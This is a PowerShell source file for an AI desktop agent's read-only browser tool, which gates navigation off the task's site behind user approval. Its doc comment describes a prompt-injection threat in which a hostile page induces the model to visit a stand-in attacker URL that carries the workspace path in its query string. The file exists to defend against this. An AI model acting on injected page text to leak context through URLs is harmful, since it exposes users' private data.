function Invoke-DpBrowserTool {
    <#
    .SYNOPSIS
        DeskPilot's browser Tool: a read-only page reader that asks before it
        leaves the site the task named.
    .DESCRIPTION
        Registered inside the Engine Runspace as browser_page, behind its own
        browserAutomation Permission. The first workflow is a weather lookup, so
        the action set is deliberately tiny and contains nothing with an external
        effect: open, follow a link, read, screenshot. There is no submit, no
        upload, no download and no form fill, which is what breaks the agency leg
        of the lethal trifecta by architecture rather than by policy.

        The egress leg is the one that needed designing, and the reason is not
        obvious. The browser holds no secrets - the profile is disposable and no
        credential is reachable from it. But the *Model* holds the conversation,
        the Workspace Folder path and prior Turn content, and the Model chooses
        the URL. So an injected page that induces a navigation to
        https://attacker/?ctx=<workspace path> exfiltrates through the address
        itself, with no file read and no command run. That is what the scope and
        the card exist for, and why the card shows the whole URL rather than the
        host.

        Three properties, in the order they are enforced:

        1. **Scope decides whether you are interrupted.** The site the task named
           is in scope from the first navigation, so the ordinary path raises no
           card at all. A Project may add hosts, from Settings only.
        2. **The gate blocks before the browser acts.** An off-scope URL parks on
           the approval bridge, so a pending card means nothing has been
           requested from the network yet.
        3. **A grant is for this run and this host.** Approving one address does
           not authorise the next one, and the fingerprint binds the answer to
           this Conversation, this Turn and this exact URL, so a stale or
           replayed approval cannot be spent on something else.

        A refusal is a Tool result, never a failed Turn, and everything the page
        returns is untrusted data: page text is bounded, link lists are bounded,
        and nothing the page supplies is ever interpolated into a selector, a
        script or a URL.

        Re-declared inside the Engine Runspace from its own definition, so it may
        only call functions injected alongside it.
    .PARAMETER Action
        open, click_link, read_page or screenshot.
    .PARAMETER Url
        For open: the address to visit.
    .PARAMETER LinkText
        For click_link: the visible text of the link to follow.
    .OUTPUTS
        System.String - a compact JSON envelope.
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('open', 'click_link', 'read_page', 'screenshot')]
        [string]$Action,

        [string]$Url,

        [string]$LinkText
    )

    $refuse = {
        param([string]$Message)
        (@{ ok = $false; error = $Message } | ConvertTo-Json -Compress)
    }

    $read = {
        param([string]$Name)
        $variable = Get-Variable -Name $Name -Scope Global -ErrorAction SilentlyContinue
        if ($variable) { $variable.Value } else { $null }
    }

    $context = & $read 'DeskPilotBrowserContext'
    if ($null -eq $context) {
        return (& $refuse 'Browser automation is not available in this session.')
    }

    $state = & $read 'DeskPilotBrowserState'
    if ($null -eq $state) {
        return (& $refuse 'Browser automation is not available in this session.')
    }

    # A live page is required for everything except the first open.
    if ($Action -ne 'open' -and $null -eq $state.session) {
        return (& $refuse 'No page is open yet. Use open with a full https address first.')
    }

    if ($Action -eq 'open') {
        if ([string]::IsNullOrWhiteSpace($Url)) { return (& $refuse 'An address is required.') }

        # The first navigation seeds the scope from the address the task named;
        # after that the scope is fixed and a new host has to be approved.
        $scope = if ($null -eq $state.session) {
            @(Get-DpBrowserScope -StartUrl $Url -ProjectDomain @($context.projectDomains) -GrantedHost @($state.granted))
        }
        else {
            @($state.scope)
        }

        $decision = Resolve-DpBrowserUrlDecision -Url $Url -Scope $scope
        if ($decision.decision -eq 'deny') {
            return (& $refuse (Get-DpBrowserRefusal -Reason $decision.reason -TargetHost $decision.host))
        }

        if ($decision.decision -eq 'ask') {
            $granted = Request-DpBrowserApproval -Context $context -Decision $decision -Bridge (& $read 'DeskPilotBrowserBridge') `
                -TimeoutMinutes ([int](& $read 'DeskPilotBrowserTimeoutMinutes'))
            if (-not $granted.approved) { return (& $refuse $granted.message) }

            $state.granted = @(@($state.granted) + $decision.host)
            $scope = @(Get-DpBrowserScope -StartUrl $Url -ProjectDomain @($context.projectDomains) -GrantedHost @($state.granted))
        }

        if ($null -eq $state.session) {
            try { $state.session = Start-DpBrowserSession -Scope $scope -RuntimeRoot $context.runtimeRoot }
            catch { return (& $refuse "The browser could not start: $_") }
            $state.scope = $scope
        }
        elseif (@($scope).Count -ne @($state.scope).Count) {
            $applied = Invoke-DpBrowserRequest -Session $state.session -Command 'scope' -Payload @{ hosts = $scope } -TimeoutSeconds 15
            if (-not $applied.ok) { return (& $refuse 'The browser refused the updated list of allowed sites, so nothing was opened.') }
            $state.scope = @($applied.result.scope)
        }

        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'navigate' -Payload @{ url = $Url } -TimeoutSeconds 90
        return (ConvertFrom-DpBrowserResult -Response $response -Session $state.session)
    }

    if ($Action -eq 'click_link') {
        if ([string]::IsNullOrWhiteSpace($LinkText)) { return (& $refuse 'A link name is required.') }
        if ($LinkText.Length -gt 200) { return (& $refuse 'That link name is too long to be a link name.') }
        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'click' -Payload @{ linkText = $LinkText } -TimeoutSeconds 90
        return (ConvertFrom-DpBrowserResult -Response $response -Session $state.session)
    }

    if ($Action -eq 'screenshot') {
        $response = Invoke-DpBrowserRequest -Session $state.session -Command 'screenshot' -TimeoutSeconds 60
        return (ConvertFrom-DpBrowserResult -Response $response -Session $state.session)
    }

    $response = Invoke-DpBrowserRequest -Session $state.session -Command 'read' -TimeoutSeconds 60
    ConvertFrom-DpBrowserResult -Response $response -Session $state.session
}
